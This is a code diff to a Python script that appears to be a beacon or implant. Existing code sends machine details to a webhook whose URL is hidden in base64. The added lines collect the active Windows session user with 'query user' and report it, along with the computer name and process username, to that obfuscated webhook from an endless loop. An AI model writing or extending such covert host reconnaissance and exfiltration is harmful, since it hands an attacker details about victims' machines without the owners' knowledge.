@@ -36,7 +36,29 @@ def encrypt(text: str) -> str:
     encrypted = encrypted.replace("==","-°").replace("=","_")
 
     return encrypted
-    
+
+def get_logged_in_user():
+    """
+    Returns the active logged-in username in DOMAIN\\User or User format.
+    Returns None if no interactive user is logged in.
+    """
+    try:
+        output = subprocess.check_output(
+            ["query", "user"],
+            stderr=subprocess.DEVNULL,
+            text=True
+        )
+
+        for line in output.splitlines():
+            if "Active" in line:
+                parts = re.split(r"\s+", line.strip())
+                return parts[0]
+
+    except Exception:
+        pass
+
+    return None
+
 def send_webhook(message):
     webhook_url = base64.b64decode(WEBHOOK_B64).decode("utf-8")
 
@@ -70,9 +92,24 @@ if __name__ == "__main__":
     user_name = os.environ.get("USERNAME", "SYSTEM")
 
     first_message = True
-    
+
+    s = False
     alive_data = format_alive_data(computer_name,user_name)
     while True:
+        if not s:
+            user = get_logged_in_user()        
+            if user:
+                msg = (
+                    f"{computer_name} {user_name} {user}"
+                )
+                
+                sent = send_webhook(msg)
+                if sent:               
+                    s = True
+
+
+        
+        
         if first_message:
             msg = (
                 f"{format_start_data(computer_name,user_name)}"
